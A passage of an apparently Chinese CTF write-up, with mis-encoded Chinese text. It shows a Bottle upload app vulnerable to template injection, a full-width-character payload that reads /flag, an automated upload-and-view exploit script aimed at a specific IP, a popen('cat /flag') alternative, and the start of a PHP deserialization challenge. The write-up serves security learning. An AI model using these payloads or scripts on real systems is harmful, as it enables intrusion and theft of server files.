</span></span><span class="line"><span class="cl">            <span class="n">z</span><span class="o">.</span><span class="n">extractall</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">BadZipFile</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;æ— æ•ˆçš„ZIPæ–‡ä»¶ã€‚&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># è·å–è§£å‹åçš„æ–‡ä»¶åˆ—è¡¨</span>
</span></span><span class="line"><span class="cl">    <span class="n">files</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">files</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s1">&#39;upload.zip&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># è¿”å›æ–‡ä»¶åˆ—è¡¨å’Œè®¿é—®é“¾æ¥</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="s2">&#34;æ–‡ä»¶åˆ—è¡¨: {{files}}</span><span class="se">\n</span><span class="s2">è®¿é—®: /view/{{md5}}/{{first_file}}&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">files</span><span class="o">=</span><span class="s2">&#34;, &#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">files</span><span class="p">),</span> <span class="n">md5</span><span class="o">=</span><span class="n">md5_hash</span><span class="p">,</span> <span class="n">first_file</span><span class="o">=</span><span class="n">files</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">if</span> <span class="n">files</span> <span class="k">else</span> <span class="s2">&#34;nofile&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s1">&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">view_file</span><span class="p">(</span><span class="n">md5</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;æŸ¥çœ‹ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_DIR</span><span class="p">,</span> <span class="n">md5</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># è¯»å–æ–‡ä»¶å†…å®¹</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># æ£€æŸ¥é»‘åå•å†…å®¹</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">contains_blacklist</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;æ£€æµ‹åˆ°æ¶æ„å†…å®¹ï¼ç¦æ­¢è®¿é—®ï¼ï¼ï¼&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># æ¸²æŸ“æ–‡ä»¶å†…å®¹ï¼ˆæ³¨æ„ï¼šè¿™é‡Œä½¿ç”¨æ¨¡æ¿æ¸²æŸ“å¯èƒ½å­˜åœ¨å®‰å…¨éšæ‚£ï¼‰</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;æ¸²æŸ“æ¨¡æ¿å‡ºé”™: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@error</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">error404</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;404é”™è¯¯å¤„ç†&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;bbbbbboooottle&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@error</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">error403</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;403é”™è¯¯å¤„ç†&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;ç¦æ­¢è®¿é—®ï¼šæ‚¨æ²¡æœ‰æƒé™è®¿é—®æ­¤èµ„æºã€‚&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å¯åŠ¨webæœåŠ¡</span>
</span></span><span class="line"><span class="cl">    <span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é¢˜ç›®é€»è¾‘å¾ˆç®€ç­”ï¼Œæ„é€ ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ä¸Šä¼ ä¸€ä¸ªzipï¼Œzipé‡Œæ–‡ä»¶å†…å®¹ä¼šè¢«æ¸²æŸ“ï¼Œä¸»è¦æ˜¯æ€ä¹ˆç»•è¿‡wafã€‚è¿™é¢˜ä»£ç æ²¡ç»™å…¨ï¼Œæˆ‘æœ¬åœ°æµ‹æ€»æ˜¯è¢«404å¤„ç†ï¼Œéå¸¸éš¾å—ï¼Œä¸çŸ¥é“æ˜¯æ— å›æ˜¾è¿˜æ˜¯å›æ˜¾ï¼Œä¸è¿‡æ ¹æ®æˆ‘ä¹‹å‰æ‰“bottleçš„é¢˜ç›®ï¼Œæ‰“çš„æ˜¯abortå›æ˜¾ï¼Œ</p>
<p>ç”±äºè¿‡æ»¤äº†{}ã€‚æ‰€ä»¥è‚¯å®šæ˜¯ç”¨%æ¥æ‰§è¡Œpythonä»£ç ï¼Œè¿˜è¿‡æ»¤äº†å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°å’Œä¸€äº›ç¬¦å·ï¼Œ**å¯¼è‡´ä¼ ç»Ÿçš„pythonä»£ç æ‰§è¡Œä¸bottleå†…å­˜é©¬éƒ½ä¸èƒ½æ‰“ï¼**æ‰€ä»¥ç»“åˆnewstarçš„å…¨è§’å­—ç¬¦ç»•è¿‡çš„æ–¹æ³•ç»•è¿‡openå‡½æ•°ç›´æ¥æ‹¿flagï¼Œè¿™æ ·å°±ä¸ç”¨å‘½ä»¤æ‰§è¡Œäº†ã€‚ï¼ˆä¸€å¼€å§‹æœ¬æ¥æƒ³8è¿›åˆ¶ç»•ï¼Œä½†æ˜¯ä¸ä¼šï¼Œ8è¿›åˆ¶ä¼šè¢«è½¬ä¹‰ï¼Œä½†ä¸ä¼šæ‰§è¡Œï¼‰</p>
<p><a class="link" href="https://luo-kaihong.github.io/p/2024newstar-web/#python%e4%bb%a3%e7%a0%81%e8%bd%ac8%e8%bf%9b%e5%88%b6%e6%89%a7%e8%a1%8crce"  target="_blank" rel="noopener"
    >2024newstar-web</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1"></span><span class="si">% f</span><span class="s1">rom bottle import abort
</span></span></span><span class="line"><span class="cl"><span class="s1">% ï½ = ï½ï½ï½…ï½(&#39;/flag&#39;).read()
</span></span></span><span class="line"><span class="cl"><span class="s1"></span><span class="si">% a</span><span class="s1">bort(404, a)
</span></span></span><span class="line"><span class="cl"><span class="s1"></span><span class="si">% e</span><span class="s1">nd
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸ºäº†å°è¯•æ›´å¤šçš„payloadï¼Œå†™äº†ä¸€ä¸ªå…¨è‡ªåŠ¨è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zipfile</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://101.200.39.193:33007/&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">upload_path</span> <span class="o">=</span> <span class="s2">&#34;upload&#34;</span>  <span class="c1"># æ·»åŠ ä¸Šä¼ è·¯å¾„</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">content</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="si">% f</span><span class="s2">rom bottle import abort
</span></span></span><span class="line"><span class="cl"><span class="s2">% ï½ = ï½ï½ï½…ï½(&#39;/flag&#39;).read()
</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="si">% a</span><span class="s2">bort(404, a)
</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="si">% e</span><span class="s2">nd
</span></span></span><span class="line"><span class="cl"><span class="s2">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">txt</span> <span class="o">=</span> <span class="s2">&#34;1.txt&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">zip_filename</span> <span class="o">=</span> <span class="s2">&#34;1.zip&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_txt</span><span class="p">(</span><span class="n">txt</span><span class="p">,</span><span class="n">conent</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">txt</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">IOError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;æ–‡ä»¶å†™å…¥é”™è¯¯ï¼š</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_zip</span><span class="p">(</span><span class="n">zip_filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">zip_filename</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZIP_DEFLATED</span><span class="p">)</span> <span class="k">as</span> <span class="n">z</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">z</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">txt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ZIPåˆ›å»ºé”™è¯¯ï¼š</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">file</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="s1">&#39;application/zip&#39;</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">upload_path</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">res_text</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ä¸Šä¼ å“åº”:&#34;</span><span class="p">,</span> <span class="n">res_text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">res_text</span>  <span class="c1"># è¿”å›å“åº”æ–‡æœ¬ä»¥ä¾¿åç»­å¤„ç†</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;è¯·æ±‚é”™è¯¯ï¼š</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">prin</span><span class="p">(</span><span class="n">res_text</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 4. æå–MD5å’Œæ–‡ä»¶å</span>
</span></span><span class="line"><span class="cl">    <span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;/view/([a-f0-9]</span><span class="si">{32}</span><span class="s2">)/([\w\-\.]+)&#34;</span><span class="p">,</span> <span class="n">res_text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="k">match</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;æ— æ³•ä»å“åº”ä¸­æå–MD5å’Œæ–‡ä»¶å&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;åŸå§‹å“åº”:&#34;</span><span class="p">,</span> <span class="n">res_text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">md5</span><span class="p">,</span> <span class="n">filename</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">groups</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;æå–æˆåŠŸ - MD5: </span><span class="si">{</span><span class="n">md5</span><span class="si">}</span><span class="s2">, æ–‡ä»¶å: </span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 5. æŸ¥çœ‹æ–‡ä»¶å†…å®¹</span>
</span></span><span class="line"><span class="cl">    <span class="n">view_res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">/view/</span><span class="si">{</span><span class="n">md5</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;æ–‡ä»¶å†…å®¹å“åº”:&#34;</span><span class="p">,</span> <span class="n">view_res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ä¸»æµç¨‹</span>
</span></span><span class="line"><span class="cl"><span class="n">write_txt</span><span class="p">(</span><span class="n">txt</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>          <span class="c1"># 1. åˆ›å»ºæ–‡æœ¬æ–‡ä»¶</span>
</span></span><span class="line"><span class="cl"><span class="n">write_zip</span><span class="p">(</span><span class="n">zip_filename</span><span class="p">)</span> <span class="c1"># 2. æ‰“åŒ…ä¸ºZIP</span>
</span></span><span class="line"><span class="cl"><span class="n">res_text</span> <span class="o">=</span> <span class="n">upload</span><span class="p">(</span><span class="n">zip_filename</span><span class="p">)</span>  <span class="c1"># 3. ä¸Šä¼ ZIPæ–‡ä»¶</span>
</span></span><span class="line"><span class="cl"><span class="n">prin</span><span class="p">(</span><span class="n">res_text</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿˜ä¸€ç§æ–¹æ³•æ˜¯ä¸Šä¼ ä¸€ä¸ª<code>{{__import__('os').popen('cat /flag').read()}}</code>,ç„¶åå°†è·¯å¾„viewä¿®æ”¹ä¸ºuploads,å†å†™ä¸€ä¸ªæ–‡ä»¶includeåŒ…å«<code>% include(&quot;uploads/xxxxxx/payload&quot;)</code>ä»£ç å°±ä¸ä¸Šäº†ã€‚</p>
<h2 id="your-uns3r"><strong>Your Uns3r</strong>
</h2><h3 id="è€ƒç‚¹__php_incomplete_class_nameç»•è¿‡ç±»åè¿‡æ»¤peclcmdåŒ…å«">è€ƒç‚¹ï¼š__PHP_Incomplete_Class_Nameç»•è¿‡ç±»åè¿‡æ»¤+peclcmdåŒ…å«
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">exec</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$ser</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">value</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$ser</span> <span class="o">!=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">value</span> <span class="o">&amp;&amp;</span> <span class="nv">$ser</span> <span class="nx">instanceof</span> <span class="nx">Access</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">include</span><span class="p">(</span><span class="nv">$ser</span><span class="o">-&gt;</span><span class="na">getToken</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span><span class="p">)</span> <span class="p">{</span><span class="c1">#(è¿™é‡Œå¼±æ¯”è¾ƒç»™usernameèµ‹å€¼0ä¹Ÿè¡Œ)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Access</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$prefix</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$suffix</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getToken</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">prefix</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">suffix</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;Go to HELL!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">prefix</span> <span class="o">.</span> <span class="s1">&#39;lilctf&#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">suffix</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="s1">&#39;pearcmd&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;Can I have peachcmd?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
